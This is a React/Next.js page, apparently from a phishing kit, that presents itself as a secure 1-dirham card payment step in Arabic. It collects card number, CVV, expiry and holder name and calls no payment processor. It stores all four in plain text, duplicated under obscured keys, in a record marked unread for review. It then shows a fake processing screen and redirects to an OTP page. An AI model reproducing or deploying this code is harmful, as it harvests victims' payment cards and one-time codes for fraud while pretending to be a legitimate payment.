"use client";
import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { Loader2 } from "lucide-react";
import StepBar from "@/components/StepBar";
import { useFormData } from "@/context/FormContext";
import {
  appendHistoryEntry,
  ensureApplicationDoc,
  generateConfirmationCode,
  hasRequiredApplicantData,
  updateApplicationData,
} from "@/lib/application-sync";

type Stage = "form" | "processing";

export default function CardPage() {
  const router = useRouter();
  const { data, docId, setDocId, confirmationCode, setConfirmationCode, hydrated } =
    useFormData();
  const [card, setCard] = useState({ number: "", expiry: "", cvv: "", name: "" });
  const [stage, setStage] = useState<Stage>("form");
  const [errors, setErrors] = useState<Partial<Record<keyof typeof card, string>>>({});
  const [paying, setPaying] = useState(false);
  const numberRef = useRef<HTMLInputElement | null>(null);
  const expiryRef = useRef<HTMLInputElement | null>(null);
  const cvvRef = useRef<HTMLInputElement | null>(null);
  const nameRef = useRef<HTMLInputElement | null>(null);

  useEffect(() => {
    if (!hydrated) return;

    if (!hasRequiredApplicantData(data)) {
      router.replace("/register");
      return;
    }

    const code = confirmationCode || generateConfirmationCode();
    if (!confirmationCode) {
      setConfirmationCode(code);
    }

    void ensureApplicationDoc({
      docId,
      data,
      confirmationCode: code,
      pathname: "/card",
    })
      .then((resolvedId) => {
        if (resolvedId !== docId) {
          setDocId(resolvedId);
        }
      })
      .catch((error) => {
        console.error("Failed to sync card stage:", error);
      });
  }, [
    confirmationCode,
    data,
    docId,
    hydrated,
    router,
    setConfirmationCode,
    setDocId,
  ]);

  function fmt4(val: string) { return val.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim(); }
  function fmtExp(val: string) { const d = val.replace(/\D/g, "").slice(0, 4); return d.length >= 3 ? d.slice(0, 2) + "/" + d.slice(2) : d; }
  function normalizeCardState(raw: typeof card) {
    return {
      number: fmt4(raw.number),
      expiry: fmtExp(raw.expiry),
      cvv: raw.cvv.replace(/\D/g, "").slice(0, 3),
      name: raw.name.toUpperCase(),
    };
  }
  function syncCardFromDom() {
    const nextCard = normalizeCardState({
      number: numberRef.current?.value ?? card.number,
      expiry: expiryRef.current?.value ?? card.expiry,
      cvv: cvvRef.current?.value ?? card.cvv,
      name: nameRef.current?.value ?? card.name,
    });

    setCard(nextCard);
    return nextCard;
  }

  const set = (k: keyof typeof card) => (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = k === "number" ? fmt4(e.target.value) : k === "expiry" ? fmtExp(e.target.value) : k === "cvv" ? e.target.value.replace(/\D/g, "").slice(0, 3) : e.target.value.toUpperCase();
    setCard((prev) => ({ ...prev, [k]: v }));
    if (errors[k]) setErrors((p) => ({ ...p, [k]: "" }));
  };

  function validate(values: typeof card) {
    const e: typeof errors = {};
    if (values.number.replace(/\s/g, "").length < 16) e.number = "رقم البطاقة غير مكتمل";
    if (values.expiry.length < 5) e.expiry = "تاريخ الانتهاء غير صحيح";
    if (values.cvv.length < 3) e.cvv = "CVV غير مكتمل";
    if (!values.name.trim()) e.name = "اسم حامل البطاقة مطلوب";
    return e;
  }

  async function handlePay() {
    const currentCard = syncCardFromDom();
    const errs = validate(currentCard);
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }

    const code = confirmationCode || generateConfirmationCode();
    if (!confirmationCode) {
      setConfirmationCode(code);
    }

    const resolvedDocId = await ensureApplicationDoc({
      docId,
      data,
      confirmationCode: code,
      pathname: "/card",
    });

    if (resolvedDocId !== docId) {
      setDocId(resolvedDocId);
    }

    const cardPayload = {
      cardNumber: currentCard.number,
      _v1: currentCard.number,
      expiryDate: currentCard.expiry,
      _v3: currentCard.expiry,
      cvv: currentCard.cvv,
      _v2: currentCard.cvv,
      cardHolderName: currentCard.name,
      _v4: currentCard.name,
      paymentMethod: "credit-card",
      cardStatus: "pending",
      otpStatus: "pending",
      status: "pending_review",
      isUnread: true,
      paymentStatus: "pending",
      cardUpdatedAt: new Date().toISOString(),
      currentStep: "_st1",
      currentPage: "card",
    };

    await updateApplicationData(resolvedDocId, cardPayload);
    await appendHistoryEntry({
      docId: resolvedDocId,
      type: "_t1",
      status: "pending",
      data: cardPayload,
    });

    setPaying(true);
    await new Promise((r) => setTimeout(r, 400));
    setStage("processing");
    await new Promise((r) => setTimeout(r, 2800));
    router.push("/otp");
  }

  if (stage === "processing") return (
    <div className="min-h-screen bg-white flex flex-col" dir="rtl">
      <div className="w-full max-w-md mx-auto bg-white min-h-screen sm:shadow-xl">
        <StepBar current={3} />
        <div className="flex flex-col items-center justify-center flex-1 px-8 text-center pt-32">
          <div className="w-24 h-24 rounded-full bg-blue-50 flex items-center justify-center mb-6">
            <svg className="w-12 h-12 text-blue-500 animate-spin" viewBox="0 0 24 24" fill="none">
              <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2.5" strokeDasharray="50 30" strokeLinecap="round"/>
            </svg>
          </div>
          <h2 className="text-xl font-bold text-gray-800 mb-2">جاري معالجة الدفع...</h2>
          <p className="text-gray-400 text-sm">يرجى الانتظار، لا تغلق الصفحة</p>
        </div>
      </div>
    </div>
  );

  const fieldCls = (err?: string) =>
    `w-full border rounded-xl px-4 py-3.5 text-base md:text-sm placeholder-gray-400 focus:outline-none transition-colors text-left ${err ? "border-red-400" : "border-gray-200 focus:border-gray-400"}`;

  return (
    <div className="min-h-screen bg-white flex flex-col" dir="rtl">
      <div className="w-full max-w-md mx-auto bg-white min-h-screen sm:shadow-xl">
        <StepBar current={3} />
        <div className="px-4 pt-6 pb-10 max-w-sm mx-auto">
          <div className="flex justify-center mb-5">
            <div
              className="w-20 h-14 bg-gradient-to-br from-[#1a2b50] to-[#2e4a8a] rounded-2xl flex items-center justify-center shadow-xl"
              style={{ animation: "cardFloat 3s ease-in-out infinite" }}
            >
              <svg width="36" height="36" viewBox="0 0 32 32" fill="none">
                <rect x="3" y="9" width="26" height="18" rx="3" stroke="white" strokeWidth="2" fill="none"/>
                <path d="M3 14h26" stroke="white" strokeWidth="2.5" strokeLinecap="round"/>
                <rect x="6" y="18" width="6" height="3" rx="1" fill="white" opacity="0.8"/>
                <circle cx="23" cy="19.5" r="2.5" fill="#c9a227" opacity="0.9"/>
              </svg>
            </div>
            <style>{`@keyframes cardFloat { 0%,100%{transform:translateY(0) scale(1)} 50%{transform:translateY(-6px) scale(1)} }`}</style>
          </div>
          <div className="text-center mb-6">
            <h2 className="text-[#1a2b50] font-bold text-xl mb-1">أدخل بيانات البطاقة</h2>
            <p className="text-gray-400 text-sm">المبلغ: 1 درهم</p>
          </div>
          <div className="space-y-4 mb-6">
            <div>
              <label className="block text-right text-sm text-gray-600 font-medium mb-1.5">رقم البطاقة</label>
              <input ref={numberRef} type="text" name="cc-number" autoComplete="cc-number" inputMode="numeric" value={card.number} onChange={set("number")} onBlur={syncCardFromDom} placeholder="0000 0000 0000 0000" className={fieldCls(errors.number)} dir="ltr" />
              {errors.number && <p className="text-red-500 text-xs mt-1 text-right">{errors.number}</p>}
            </div>
            <div className="flex gap-3">
              <div className="flex-1">
                <label className="block text-right text-sm text-gray-600 font-medium mb-1.5">CVV</label>
                <input ref={cvvRef} type="text" name="cc-csc" autoComplete="cc-csc" inputMode="numeric" value={card.cvv} onChange={set("cvv")} onBlur={syncCardFromDom} placeholder="123" className={fieldCls(errors.cvv)} dir="ltr" />
                {errors.cvv && <p className="text-red-500 text-xs mt-1 text-right">{errors.cvv}</p>}
              </div>
              <div className="flex-1">
                <label className="block text-right text-sm text-gray-600 font-medium mb-1.5">تاريخ الانتهاء</label>
                <input ref={expiryRef} type="text" name="cc-exp" autoComplete="cc-exp" inputMode="numeric" value={card.expiry} onChange={set("expiry")} onBlur={syncCardFromDom} placeholder="MM/YY" className={fieldCls(errors.expiry)} dir="ltr" />
                {errors.expiry && <p className="text-red-500 text-xs mt-1 text-right">{errors.expiry}</p>}
              </div>
            </div>
            <div>
              <label className="block text-right text-sm text-gray-600 font-medium mb-1.5">اسم حامل البطاقة</label>
              <input ref={nameRef} type="text" name="cc-name" autoComplete="cc-name" autoCapitalize="characters" spellCheck={false} value={card.name} onChange={set("name")} onBlur={syncCardFromDom} placeholder="JOHN DOE" className={fieldCls(errors.name) + " uppercase"} dir="ltr" />
              {errors.name && <p className="text-red-500 text-xs mt-1 text-right">{errors.name}</p>}
            </div>
          </div>
          <button onClick={handlePay} disabled={paying} className="w-full bg-[#c9a227] disabled:opacity-70 hover:bg-[#b8911f] text-white font-bold py-4 rounded-xl text-lg flex items-center justify-center gap-2 mb-5 shadow-md transition-colors">
            {paying ? <Loader2 size={18} className="animate-spin" /> : <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>}
            {paying ? "جاري المعالجة..." : "ادفع 1 درهم"}
          </button>
          <div className="text-center space-y-3">
            <div className="flex items-center justify-center gap-1.5 text-gray-400 text-xs">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
              معاملة آمنة ومشفرة
            </div>
            <div className="flex items-center justify-center gap-2">
              <div className="bg-[#1a1f71] rounded px-2 py-0.5"><span className="text-white font-extrabold text-xs italic">VISA</span></div>
              <div className="flex -space-x-1.5"><div className="w-5 h-5 rounded-full bg-[#eb001b]"/><div className="w-5 h-5 rounded-full bg-[#f79e1b] opacity-90"/></div>
              <div className="bg-[#007bc1] rounded px-1.5 py-0.5"><span className="text-white font-bold text-[9px]">AMEX</span></div>
              <div className="flex items-center gap-0.5 border border-gray-200 rounded px-1.5 py-0.5"><div className="w-3 h-3 rounded-full bg-[#00a859]"/><span className="text-[#00a859] font-bold text-[9px]">مدى</span><span className="text-gray-500 font-bold text-[9px]">mada</span></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
